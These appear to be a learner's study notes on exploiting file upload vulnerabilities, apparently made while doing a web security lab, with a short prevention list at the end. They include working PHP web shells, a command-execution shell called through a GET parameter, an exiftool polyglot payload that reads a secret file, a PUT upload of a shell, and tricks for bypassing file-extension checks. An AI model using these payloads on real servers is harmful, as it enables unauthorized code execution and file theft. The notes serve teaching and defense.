# How do web servers handle requests for static files? 
At some point, the server parses the path in the request to identify the file extension. It then uses this to determine the type by comparing mappings between extensions and MIME types. 
- If the file type is non-executable, the server may just send the file contents to the HTTP response
- If the file type is executable, AND the server is configured to execute it, the server will execute it and send the results to an HTTP response.
- If the file type is executable, BUT the server isn't configured to execute it, there may be an error. Sometimes, contents of the file is served as plain text, leaking source code and sensitive info. 

# Exploiting unrestricted file uploads to deploy a web shell
If executable uploads are unrestricted, you can gain full control of the server. 

File exfiltration webshell: 
```
<?php echo file_get_contents('/path/to/target/file'); ?> 
```

HTTP parameter webshell: 
```
<?php echo system($_GET['command']); ?> 

Execute arbitrary commands with: 
GET /example/exploit.php?command=id HTTP/1.1 
```

# Exploiting flawed validation of file uploads
It's unlikely that there is no protection of file uploads, but there are wrong ways to sanitize and validate uploads.

## Flawed file type validation
The content type `application/x-www-form-url-encoded` is fine for sending simple text, but large amounts of binary data is better with `multipart/form-data`.

Example: 
```
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...binary content of example.jpg...]

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

This is an interesting description of my image.

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"

wiener
---------------------------012345678901234567890123456-- 
```

Each part of the body has a `Content-Disposition` header, which provides some basic info about each input field. They may also have `Content-Type` headers. If the server is validating uploads using the `Content-Type` header only, bypassing restrictions is trivial.

## Preventing file execution in user-accessible directories
As a precaution, servers generally only run scripts whose MIME type they have been configured to execute. In some cases, the contents of the file are served in plaintext. This is a good way to leak source code. However, if you can upload a script to a different directory, the server may execute it anyways.

Tip: Servers often use the `filename` field in `multipart/form-data` requests to determine where files should be saved.

## Insufficient blacklisting of dangerous file types
Blacklisting is often flawed because its hard to blacklist all dangerous extensions. Instead of `.php` you could use `.php5` or `.shtml` and so on.

### Overriding the server configuration
Servers typically need to be configured to execute certain filetypes. 

For example, to execute PHP on Apache, the following might be added to the `/etc/apache2/apache2.conf` file: 

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php
```

Apache also allows special override configuration files for each directory with the `.htaccess` file:

```
AddHandler application/x-httpd-php .php .php5 .php4 .php3
```

IIS servers usually have a `web.config` file to map extensions to MIME types.

```
<staticContent>
  <mimeMap fileExtension=".json" mimeType="application/json" />
</staticContent> 
```

If you can override the configuration, you can trick the server to associate a custom file extension to an executable MIME type.

### Obfuscating file extensions
Parsing of the file extensions can be faulty or different in multiple steps. There are ways to exploit this. 
- Modify the case like `exploit.pHp` instead of `exploit.php`
- Provide multiple extensions like `exploit.php.jpg`
- Add trailing characters/whitespaces like `exploit.php.`
- Try URL encoding (or double encoding) like `exploit%2Ephp`
- Add semicolons or URL-encoded null byte characters like `exploit.asp;.jpg` or `exploit.asp%00.jpg`
- Try multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion. Sequences like `xC0 x2E` `xC4 xAE` or `xC0 xAE` may be translated to `x2E`
- Try sneaking in extensions to abuse flawed stripping like `exploit.p.phphp`

## Flawed validation of the file's contents
More secure servers try to verify that the contents are expected. For example, the server might try to verify an image's dimensions or a sequence of bytes in the header/footer. JPEG files always begin with the bytes `FF D8 FF`. There are special tools like ExifTool to create a polyglot JPEG file containing malicious code.

Example: 
```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```

## Exploiting file upload race conditions
Some servers take precautions like uploading to a temporary, sandboxed directory and randomizing the name. Then validation is performed and the file is transferred to the destination. 

However, some developers implement their own processing. Some websites upload the file directly and then remove it if it doesn't pass validation. The attacker can still execute the file in the small time window. 

> Tip: Use Turbo Intruder with the `race.py` payload and configure the gates.

# Exploiting file upload vulnerabilities without remote code execution
Although remote code execution is serious, there are still other ways to exploit file upload vulnerabilities. 

- HTML and SVG images can potentially be vulnerable to stored XSS payloads. 
- If the server parses some language like XML-based files, there may be a possible XXE injection.

Some servers support `PUT` requests. This can be an alternative way to upload files. 
```
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?> 
```

# How to prevent file upload vulnerabilities
- Check the file extension against a whitelist instead of a blacklist.
- Make sure the filename doesn't contain substrings like `../` for directory traversal
- Rename uploaded files to avoid collisions and overwriting
- Do not upload files to the server's filesystem until validation
- Use established frameworks for preprocessing file uploads rather than handwritten ones